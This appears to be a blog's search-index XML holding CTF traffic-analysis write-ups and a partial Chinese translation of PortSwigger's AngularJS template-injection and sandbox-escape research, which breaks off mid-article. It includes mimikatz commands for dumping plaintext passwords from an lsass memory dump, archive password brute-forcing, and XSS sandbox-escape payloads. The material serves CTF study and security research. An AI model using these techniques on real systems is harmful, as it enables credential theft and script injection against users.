<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>welcome to my blog</title>
    <url>/6666/07/27/welcome-to-my-blog/</url>
    <content><![CDATA[<p>我是Charmersix，这个名字，大家可能不认识，你们可以叫我C&amp;S,实在不行，可以叫我小六。<br>是一名小学生ctfer，为了方便自己记笔记，所以效仿身边的大佬，搭了这个blog。<br>这里将会写一些wp。<br>虽然叫wp，但是就是个人的刷题笔记，既然是笔记，就会有些地方详细，有些地方粗略。<br>都不一定有人看，所以全当自己笔记。</p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>SkyMirror_WP_流量分析</title>
    <url>/2022/05/03/SkyMirror-WP-simple-flow/</url>
    <content><![CDATA[<h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>题目在<a href="http://ctfer.club/challenges#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2-22">这儿</a></p>
<p>wireshark打开，追踪流一波</p>
<p><img src="https://img-blog.csdnimg.cn/8681ca6cf41b4ee8ad3bee70daf34653.png"></p>
<p>这base64编码，来<a href="https://the-x.cn/base64">这儿</a>解码一下</p>
<p>然后就能得到一张图片</p>
<p><img src="https://img-blog.csdnimg.cn/8dffbdfa0a2444ac95f89e9400f1059d.png"></p>
<p>flag显而易见</p>
<h3 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h3><p>题目在<a href="http://ctfer.club/challenges#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E6%96%87%E4%BB%B6-77">这儿</a></p>
<p>这题可不全是流量分析 </p>
<p>wireshark看一波</p>
<p><img src="https://img-blog.csdnimg.cn/53a3e30cf7174b7e894366f924839f17.png"></p>
<p>一打眼，有ftp，一想《文件》，筛选一下ftp</p>
<p><img src="https://img-blog.csdnimg.cn/f5a1e6339a0b4b31a20f4b56f99b1961.png"></p>
<p>追踪一波</p>
<p><img src="https://img-blog.csdnimg.cn/0ae681604366452cb1734398aae98177.png"></p>
<p>看见了rar</p>
<p>然后foremost分离一波</p>
<p>讲到foremost，Kali linux里一般有，如果万一没有，像我下载的kali2021，可以apt下载一下</p>
<p>像这样</p>
<blockquote>
<p><code>sudo apt-get update</code><br><code>sudo apt-get install foremost</code></p>
</blockquote>
<p>然后直接</p>
<blockquote>
<p><code>foremost  文件地址/文件名</code></p>
</blockquote>
<p>如果是存在了kali目录下，就不用加文件地址了</p>
<p>分离得到的压缩包，我没有得到密码，直接就爆破了（因为没有得到任何提示）</p>
<p><code>ARCHPR</code>四位数字掩码爆破</p>
<p><img src="https://img-blog.csdnimg.cn/39d0af8b9d44411b9baf85b8a04320ae.png"></p>
<p>密码<code>5790</code></p>
<p>解压得到flag</p>
<h3 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h3><p>统计HTTP看一看，有个/upload/1.php</p>
<p>CTRL+F搜一下1.php，过滤下HTTP</p>
<p>追踪HTTP流看一看</p>
<p>小技巧，倒着看</p>
<p><img src="https://img-blog.csdnimg.cn/34f1f5ebd2cf4c9bbcf4fa1152e50178.png"></p>
<p>有个压缩包，整出来，压缩包，有密码，而且提示了</p>
<p><img src="https://img-blog.csdnimg.cn/ca8b7c20dd6e4edb97fb729c2502bf2b.png"></p>
<p>继续看</p>
<p><img src="https://img-blog.csdnimg.cn/2a1f357d0ab340ed81b65cb9b7c1546c.png"></p>
<p>Z2解码，十六进制，<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Hex%EF%BC%8816%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89('Auto')">解码</a></p>
<p>是个图片</p>
<p><img src="https://img-blog.csdnimg.cn/9676a7fc946d4cd49c1b817272b8533b.png"></p>
<p>搞定！！！</p>
<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>这题一看题目telnet，首先就过滤telnet</p>
<p>追踪流一看，发现password有提示</p>
<p><img src="https://img-blog.csdnimg.cn/af7d788eb4f444348b22cc2384f28996.png"></p>
<p>细心的小伙伴会发现这里有一些点，红色是源到目的地，蓝色反之，我们单独看一下红色的内容，发现变成了三个点，这三个点是不可见字符，而不是真正的三个点</p>
<p><img src="https://img-blog.csdnimg.cn/d5bac84c81a94da989eb75563936b64d.png"></p>
<p>看16进制，发现08</p>
<p><img src="https://img-blog.csdnimg.cn/b59ef4ccf2ec4dac8be5ee3fa6110dd6.png"></p>
<p>找ASCII码表，发现08是退格字符</p>
<p><img src="https://img-blog.csdnimg.cn/653271d88d3947f8994f971040c466f0.png"></p>
<p>所以得到flag</p>
<blockquote>
<p>28d982kwalx8e</p>
</blockquote>
<h3 id="CISCN-2021初赛-robot"><a href="#CISCN-2021初赛-robot" class="headerlink" title="[CISCN 2021初赛]robot"></a>[CISCN 2021初赛]robot</h3><p>题目在[这儿](<a href="http://ctfer.club/challenges#[CISCN">http://ctfer.club/challenges#[CISCN</a> 2021初赛]robot-128)</p>
<p>这是去年国赛里比较简单的一题，这玩意压缩包一坨东西，其实也就流量是有用的，根据其他文件百度来看，能知道这是个画图的robot。看看流量里有没有什么坐标相关的。</p>
<p>无脑追踪流看一看，</p>
<p><img src="https://img-blog.csdnimg.cn/8e9053a5ee8f4528821b0dfcb44878f0.png"></p>
<p>好像坐标，grep分出来</p>
<blockquote>
<p><code>strings a cap.pcapng |grep &quot;\[.*\]&quot; | sort -u &gt; 123.txt</code></p>
</blockquote>
<p>这种数据gnuplot没法识别，所以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">indata = file.read()</span><br><span class="line">obj = indata.replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;,&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">out_file = <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">out_file.write(obj)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;alright&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后上到gnuplot</p>
<blockquote>
<p><code>plot &quot;out.txt&quot;</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/38de08d3a84643da927746bb1438e6ad.png"></p>
<p>旋转镜像对称一下</p>
<p><img src="https://img-blog.csdnimg.cn/5507c71d79b84aec959e2974ed7abce1.png"></p>
<p><code>easy_robo_xx</code></p>
<p>记得MD5解一下</p>
<p>还是<a href="https://ctf.mzy0.com/CyberChef3/#recipe=MD5()&input=ZWFzeV9yb2JvX3h4">这里</a></p>
<p>得到flag<code>d4f1fb80bc11ffd722861367747c0f10</code></p>
<h3 id="GKCTF-2021-签到"><a href="#GKCTF-2021-签到" class="headerlink" title="[GKCTF 2021]签到"></a>[GKCTF 2021]签到</h3><p>这也配叫签到题？题目[链接]([SkyMirror (ctfer.club)](<a href="http://ctfer.club/challenges#[GKCTF">http://ctfer.club/challenges#[GKCTF</a> 2021]签到-129))</p>
<p>本以为是签到题，打开CTRL+F搜一下flag，没有，坏了，不是签到</p>
<p>追踪一下tcp吧，追踪到5，发现了f14g</p>
<p><img src="https://img-blog.csdnimg.cn/e2fb0bf2d58b4e59bfff2f7835e111ca.png"></p>
<p>乱码，还是看HTTP流吧</p>
<p>发现了</p>
<blockquote>
<p><code>64306c455357644251306c6e51554e4a5a3046355355737764306c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154576c44546d39525241707154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7162314645616b46445357644251306c6e51554e4a5a32644554545a46524530325157704e5a3046365458524e524531305257704e436e5177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d644442705130354e65556c7154586c4a616b31355357704e65556b4b4e6b467154576442656b31305455524e644556715458644a616b38775a566f324d6d56774e557377643074795556645a64315a485a48593152556c3051576c4e4d5546355a4777316255733254545a7162475a7763573579555552304d464e4d64444254544170304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d537a42425357526159585a764e7a567462485a735130354e564530325255524e436e6f77655531334d464e4e6555467154545a524e327877596a647362584a5252484a7a5131706f516c68614d446c745647637751306c355655524a4d315a74596e4676656d3951567974736357563151303477553078304d464e4d64444254544851775530774b63336858576d786b4d5659354d544e6c4e325179576d684752324a7a576d31615a7a427363446c7064573569567974585a7a427363446c7064573569567974585a7a427363446c706457356956797458537a423354586876564531336230524e6555464454517045546a4252524534775555527356324636546c684e65444258596d593562464a48556b524f5245347759584a6b4d464a6d4f565a6162444658596e644252456c6b556d46746345524c61577832526b6c6b556d46746345524c61577832566b747754544a5a436a303955556c6f545442525245347755516f3d</code></p>
</blockquote>
<p>像base16</p>
<img src="https://img-blog.csdnimg.cn/21d1f402767446fbbc6d5ecc09e3cc35.png" style="zoom:67%;" />

<p>base64解</p>
<p><img src="https://img-blog.csdnimg.cn/eec4ba4c656742d58dbf89c86d0e94d9.png"></p>
<p>根据最后一行逆序吗？好像还是一行一行的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;wIDIgACIgACIgAyIK0wIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMiCNoQD&quot;</span></span><br><span class="line">b = <span class="string">&quot;jMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjoQDjACIgACIgACIggDM6EDM6AjMgAzMtMDMtEjM&quot;</span></span><br><span class="line">c = <span class="string">&quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0iCNMyIjMyIjMyIjMyI&quot;</span></span><br><span class="line">d = <span class="string">&quot;6AjMgAzMtMDMtEjMwIjO0eZ62ep5K0wKrQWYwVGdv5EItAiM1Aydl5mK6M6jlfpqnrQDt0SLt0SL&quot;</span></span><br><span class="line">e = <span class="string">&quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLK0AIdZavo75mlvlCNMTM6EDM&quot;</span></span><br><span class="line">f = <span class="string">&quot;z0yMw0SMyAjM6Q7lpb7lmrQDrsCZhBXZ09mTg0CIyUDI3VmbqozoPW+lqeuCN0SLt0SLt0SLt0SL&quot;</span></span><br><span class="line">g = <span class="string">&quot;sxWZld1V913e7d2ZhFGbsZmZg0lp9iunbW+Wg0lp9iunbW+Wg0lp9iunbW+WK0wMxoTMwoDMyACM&quot;</span></span><br><span class="line">h = <span class="string">&quot;DN0QDN0QDlWazNXMx0Wbf9lRGRDNDN0ard0Rf9VZl1WbwADIdRampDKilvFIdRampDKilvVKpM2Y&quot;</span></span><br><span class="line">i = <span class="string">&quot;==QIhM0QDN0Q&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(b[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(c[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(d[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(e[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(f[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(g[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(h[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(i[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ed251c6a20f442fcb90df875c9ee79ce.png"></p>
<p>去重，flag出了</p>
<p><code>flag&#123;Welc0me_GkC4F_m1siCCCCCC!&#125;</code></p>
<h3 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h3><p>之前做过一次菜刀的流量分析，这次来做一个蚁剑的</p>
<p>这题挺强的，题目也是在[这儿]([SkyMirror (ctfer.club)](<a href="http://ctfer.club/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF">http://ctfer.club/challenges#[安洵杯</a> 2019]Attack-139))</p>
<p>老样子，先搜索flag看看</p>
<img src="https://img-blog.csdnimg.cn/27feb43643ff4e7f90386d3958b5b722.png" style="zoom:67%;" />

<p>这里也是看到了一个压缩包，然后我手提了n遍，一直没提准确，然后就foremost了，出一个压缩包</p>
<p>缺密码，继续看。</p>
<p>导出对象看看</p>
<p><img src="https://img-blog.csdnimg.cn/78351cb41a464e44b8af011105cef583.png"></p>
<p>这啥玩意，上百度</p>
<blockquote>
<p><strong>关于lsass</strong><br>lsass是windows系统的一个进程，用于本地安全和登陆策略。mimikatz可以从 lsass.exe 里获取windows处于active状态账号明文密码。本题的lsass.dmp就是内存运行的镜像，也可以提取到账户密码</p>
<p><strong>下载</strong><br><a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a></p>
<p><strong>如何使用</strong><br>把lsass.dmp复制到mimikatz的目录，然后运行mimikatz（一定要管理员身份运行）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ec3e694eab4e412a836b30a5575a2fd1.png"></p>
<p>这也就是压缩包密码了，解压得到flag</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>SkyMirror</tag>
        <tag>simple_flow</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入</title>
    <url>/2022/05/12/AngularJS%20xss/</url>
    <content><![CDATA[<p>文章引用自：<a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p>
<p>研究员加雷斯·海耶斯</p>
<p><a href="https://twitter.com/garethheyes">@garethheyes</a>(蓝鸟)</p>
<h3 id="抽象的"><a href="#抽象的" class="headerlink" title="抽象的"></a>抽象的</h3><p>对极受欢迎的 JavaScript 框架<a href="https://angularjs.org/">AngularJS</a>的天真使用将许多网站暴露给 Angular 模板注入。这种相对低调的<a href="https://portswigger.net/blog/server-side-template-injection">服务器端模板注入</a>兄弟可以与 Angular 沙箱逃逸相结合，以在其他安全站点上发起<a href="https://portswigger.net/web-security/cross-site-scripting">跨站点脚本</a>( <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> ) 攻击。到目前为止，还没有公开的沙盒逃逸会影响 Angular 1.3.1+ 和 1.4.0+。这篇文章将总结 Angular 模板注入的核心概念，然后展示影响所有现代 Angular 版本的新沙箱逃逸的开发。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>AngularJS 是 Google 编写的 MVC 客户端框架。使用 Angular，您通过 view-source 或 Burp 看到的包含“ng-app”的 HTML 页面实际上是模板，并将由 Angular 呈现。这意味着如果用户输入直接嵌入到页面中，应用程序可能容易受到客户端模板注入的攻击。即使用户输入是 HTML 编码的并且在属性内也是如此。</p>
<p>Angular 模板可以包含<a href="https://docs.angularjs.org/guide/expression">表达式</a> ——双花括号内的类似 JavaScript 的代码片段。要了解它们是如何工作的，请查看以下 jsfiddle：</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/">http://jsfiddle.net/2zs2yv7o/</a></p>
<p>文本输入 2 由 Angular 评估，然后显示输出：2。</p>
<p>这意味着任何能够注入双花括号的人都可以执行 Angular 表达式。Angular 表达式本身不会造成太大伤害，但是当与沙箱逃逸结合使用时，我们可以执行任意 JavaScript 并造成严重破坏。</p>
<p>以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用<a href="http://php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars</a>对输入进行 HTML 编码：</p>
<p>以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用<a href="http://php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars</a>对输入进行 HTML 编码：</p>
<p><img src="https://img-blog.csdnimg.cn/bdb80f2fc96c4212a4c78678a5b3b41a.png"></p>
<p>第二页几乎相同，但 Angular 导入意味着可以通过注入 Angular 表达式来利用它，并且通过沙箱逃逸我们可以获得 XSS。</p>
<p><img src="https://img-blog.csdnimg.cn/81d13954416d4ed4b90ce47c2ed9ed88.png"></p>
<p>请注意，您需要在 DOM 树中的表达式上方有“ng-app”。通常，Angular 站点会在根 HTML 或 body 标记中使用它。</p>
<p>换句话说，如果一个页面是一个 Angular 模板，我们将更容易对它进行 XSS 攻击。只有一个问题 - 沙盒。幸运的是，有一个解决方案。</p>
<h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>Angular 表达式被沙盒化，“以保持应用程序职责的适当分离”。为了利用用户，我们需要突破沙箱并执行任意 JavaScript。</p>
<p>让我们重用前面的小提琴，并在 Chrome 的源选项卡中的 angular.js 内的第 13275 行放置一个<a href="https://developers.google.com/web/tools/chrome-devtools/javascript/breakpoints">断点</a>。在监视窗口中，添加一个新的监视表达式“fnString”。这将显示我们转换后的输出。1+1 转换为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">return</span> <span class="title function_">plus</span>(<span class="number">1</span>, <span class="number">1</span>);&#125;;<span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure>

<p>所以表达式被解析和重写，然后由 Angular 执行。让我们尝试获取 Function 构造函数：</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/1/">http://jsfiddle.net/2zs2yv7o/1/</a></p>
<p>这是事情变得更有趣的地方，这是重写的输出：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;constructor&#x27;</span> <span class="keyword">in</span> l),    v5;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v3 = s.<span class="property">constructor</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v3 = l.<span class="property">constructor</span>;  &#125;  <span class="title function_">ensureSafeObject</span>(v3, text);  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v2 = <span class="title function_">ensureSafeObject</span>(v3.<span class="property">constructor</span>, text);  &#125; <span class="keyword">else</span> &#123;    v2 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">if</span> (v2 != <span class="literal">null</span>) &#123;    <span class="title function_">ensureSafeFunction</span>(v2, text);    v5 = <span class="string">&#x27;alert\u00281\u0029&#x27;</span>;    <span class="title function_">ensureSafeObject</span>(v3, text);    v1 = <span class="title function_">ensureSafeObject</span>(v3.<span class="title function_">constructor</span>(<span class="params">ensureSafeObject(<span class="string">&#x27;alert\u00281\u0029&#x27;</span>, text)</span>), text);  &#125; <span class="keyword">else</span> &#123;    v1 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">if</span> (v1 != <span class="literal">null</span>) &#123;    <span class="title function_">ensureSafeFunction</span>(v1, text);    v0 = <span class="title function_">ensureSafeObject</span>(<span class="title function_">v1</span>(), text);  &#125; <span class="keyword">else</span> &#123;    v0 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure>

<p>如您所见，Angular 依次遍历每个对象并使用 ensureSafeObject 函数对其进行检查。ensureSafeObject<a href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L60-L85">函数</a>检查对象是 Function 构造函数、窗口对象、DOM 元素还是 Object 构造函数。如果任何检查为真，它将引发异常并停止执行表达式。它还通过使对全局变量的所有引用改为查看对象属性来防止访问全局变量。</p>
<p>Angular 还有一些其他功能可以进行安全检查，例如<a href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L40-L58">ensureSafeMemberName</a>和<a href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L91-L103">ensureSafeFunction</a>。ensureSafeMemberName 检查 JavaScript 属性并确保它与 <strong>proto</strong> 等不匹配，并且 ensureSafeFunction 检查函数调用不调用 Function 构造函数或调用、应用和绑定。</p>
<h3 id="破坏消毒剂"><a href="#破坏消毒剂" class="headerlink" title="破坏消毒剂"></a>破坏消毒剂</h3><p>Angular sanitizer 是用 JavaScript 编写的客户端过滤器，它扩展了 Angular 以安全地允许使用名为 ng-bind-html 的属性进行 HTML 绑定，其中包含要过滤的引用。然后它接受输入并将其呈现在不可见的 DOM 树中，并对元素和属性应用白名单过滤。</p>
<p>在测试<a href="https://github.com/angular/angular.js/pull/12524">Angular sanitizer</a>时，我考虑过使用 Angular 表达式覆盖原生 JavaScript 函数。问题是 Angular 表达式不支持函数语句或函数表达式，因此您将无法用任何值覆盖函数。考虑了一会儿，我想到了 String.fromCharCode。因为该函数是从 String 构造函数调用的，而不是通过字符串文字，所以“this”值将是 String 构造函数。也许我可以后门 fromCharCode 函数！</p>
<p>如何在无法创建函数的情况下对 fromCharCode 函数进行后门？简单：重用现有功能！问题是如何在每次调用 fromCharCode 时控制该值。如果我们使用 Array 连接函数，我们可以使 String 构造函数成为一个假数组。我们所需要的只是一个长度属性和一个 0 属性，用于我们的假数组的第一个索引，幸运的是它已经有一个长度属性，因为它的参数长度是 1。我们只需要给它一个 0 属性。这是如何做到的：</p>
<p><img src="https://img-blog.csdnimg.cn/8ba945db65894a728ec97bdd6b511b7c.png"></p>
<p>当调用 String.fromCharCode 时，您每次都会得到字符串 <code>&lt;iframe onload=alert(/Backdoored/)&gt;</code> 而不是所需的值。这在 Angular 沙箱中完美运行。这是一个小提琴：</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/2/">http://jsfiddle.net/2zs2yv7o/2/</a></p>
<p>我继续查看 Angular sanitizer 的代码，但我找不到任何会导致绕过的对 String.fromCharcode 的调用。我查看了其他原生函数，发现了一个有趣的函数：charCodeAt。如果我可以覆盖这个值，那么它将被注入到一个属性中而无需任何过滤。但是有一个问题：这次“this”值将是字符串文字，而不是字符串构造函数。这意味着我不能使用相同的技术来覆盖该函数，因为我将无法操作索引或长度，因为这对于字符串文字是不可写的。</p>
<p>然后我想到了使用 [].concat; 使用此函数将按原样返回字符串和连接在一起的参数。下面的小提琴调用’abc’.charCodeAt(0)，所以你会期望输出是’97’（ascii a），但由于后门，它反而返回基本字符串加上参数。</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/3/">http://jsfiddle.net/2zs2yv7o/3/</a></p>
<p>然后这破坏了消毒剂，因为我可以注入邪恶的属性。消毒剂代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (validAttrs[lkey] === <span class="literal">true</span> &amp;&amp; (uriAttrs[lkey] !== <span class="literal">true</span> || <span class="title function_">uriValidator</span>(value, isImage))) &#123;  <span class="title function_">out</span>(<span class="string">&#x27; &#x27;</span>);  <span class="title function_">out</span>(key);  <span class="title function_">out</span>(<span class="string">&#x27;=&quot;&#x27;</span>);  <span class="title function_">out</span>(<span class="title function_">encodeEntities</span>(value));  <span class="title function_">out</span>(<span class="string">&#x27;&quot;&#x27;</span>);&#125; </span><br></pre></td></tr></table></figure>

<p>Out 将返回过滤后的输出；key 指的是属性名；value 是属性值。这是 encodeEntities 函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encodeEntities</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> value.  <span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>).  <span class="title function_">replace</span>(<span class="variable constant_">SURROGATE_PAIR_REGEXP</span>, <span class="keyword">function</span>(<span class="params">value</span>) &#123;   <span class="keyword">var</span> hi = value.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);   <span class="keyword">var</span> low = value.<span class="title function_">charCodeAt</span>(<span class="number">1</span>);   <span class="keyword">return</span> <span class="string">&#x27;&amp;#&#x27;</span> + (((hi - <span class="number">0xD800</span>) * <span class="number">0x400</span>) + (low - <span class="number">0xDC00</span>) + <span class="number">0x10000</span>) + <span class="string">&#x27;;&#x27;</span>;  &#125;).  <span class="title function_">replace</span>(<span class="variable constant_">NON_ALPHANUMERIC_REGEXP</span>, <span class="keyword">function</span>(<span class="params">value</span>) &#123;   <span class="keyword">return</span> <span class="string">&#x27;&amp;#&#x27;</span> + value.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="string">&#x27;;&#x27;</span>;  &#125;).  <span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&lt;&#x27;</span>).  <span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&gt;&#x27;</span>);&#125; </span><br></pre></td></tr></table></figure>

<p>粗体代码是发生注入的地方，因此开发人员显然希望 charCodeAt 函数返回一个 int。您可以防御性地编码并将值强制为 int，但如果攻击者可以覆盖本机函数，您可能已经拥有。这绕过了消毒剂，并使用类似的技术，我们可以突破沙箱。</p>
<h3 id="逃离沙箱"><a href="#逃离沙箱" class="headerlink" title="逃离沙箱"></a>逃离沙箱</h3><p>我查看了查找 String.fromCharCode 调用的 Angular 源代码，发现了一个<a href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L262">非常有趣</a>的实例。在解析字符串文字时，他们使用它来输出值。我想我可以后门 fromCharCode 并破解已解析的字符串。这是一个小提琴：</p>
<p><a href="http://jsfiddle.net/2zs2yv7o/4/">http://jsfiddle.net/2zs2yv7o/4/</a></p>
<p>原来我可以后门 unicode 转义但不能打破重写的代码。</p>
<p>然后我想知道我以前在消毒剂上使用的相同技术是否可以在这里与不同的本机功能一起使用。我认为使用 charAt 可以成功解析代码，但返回完全不同的输出并绕过沙箱。我尝试注入它并检查重写的输出。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;  <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=&quot;&quot;&#x27;</span>)+<span class="string">&#x27;&#x27;</span>&#125;&#125; </span><br></pre></td></tr></table></figure>

<p><a href="http://jsfiddle.net/2zs2yv7o/5/">http://jsfiddle.net/2zs2yv7o/5/</a></p>
<p>控制台有一些有趣的结果，我从浏览器而不是 Angular 收到 JavaScript 解析错误。我查看了重写的代码，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v5, v6 = l &amp;&amp; (<span class="string">&#x27;x\u003d\u0022\u0022&#x27;</span> <span class="keyword">in</span> l);  <span class="keyword">if</span> (!(v6)) &#123;    <span class="keyword">if</span> (s) &#123;      v5 = s.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v5 = l.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;  &#125;  <span class="keyword">return</span> v5;&#125;;fn.<span class="property">assign</span> = <span class="keyword">function</span>(<span class="params">s, v, l</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;x\u003d\u0022\u0022&#x27;</span> <span class="keyword">in</span> l);  v3 = v4 ? l : s;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v2 = s.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v2 = l.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;  &#125;  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v1 = v;    <span class="title function_">ensureSafeObject</span>(v3.<span class="property">x</span> = <span class="string">&quot;&quot;</span>, text);    v0 = v3.<span class="property">x</span> = <span class="string">&quot;&quot;</span> = v1;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn; </span><br></pre></td></tr></table></figure>

<p>语法错误在上面以粗体显示，如果重写的代码正在生成 JavaScript 语法错误，这意味着我可以在重写的输出中注入我自己的代码！接下来我注入了以下代码：</p>
